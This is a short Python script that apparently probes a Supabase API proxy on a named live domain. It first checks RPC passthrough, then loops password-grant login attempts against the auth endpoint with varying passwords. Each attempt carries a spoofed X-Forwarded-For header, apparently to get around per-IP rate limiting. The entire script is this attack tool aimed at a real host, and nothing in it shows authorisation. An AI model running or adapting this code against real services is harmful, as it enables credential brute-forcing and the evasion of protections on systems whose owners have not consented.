import ssl, json, urllib.request, urllib.error

ctx = ssl.create_default_context()
KEY = "<publishable-key>"

def req(method, url, body=None, xff=None):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY}
    if xff:
        h["X-Forwarded-For"] = xff
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

B = "https://onlyfakeai.ru/api/supabase"
# passthrough check
st, txt = req("POST", B + "/rest/v1/rpc/get_total_counts")
print("proxy rpc:", st, txt[:200])

# gotrue token grant through the proxy with spoofed XFF
for i in range(6):
    xff = f"198.51.100.{i+1}"
    st, txt = req("POST", B + "/auth/v1/token?grant_type=password",
                  body={"email": "rat4080probeewb44z@gmail.com", "password": f"proxyTest{i}!"},
                  xff=xff)
    print(f"xff {xff} -> {st} {txt[:120]}")
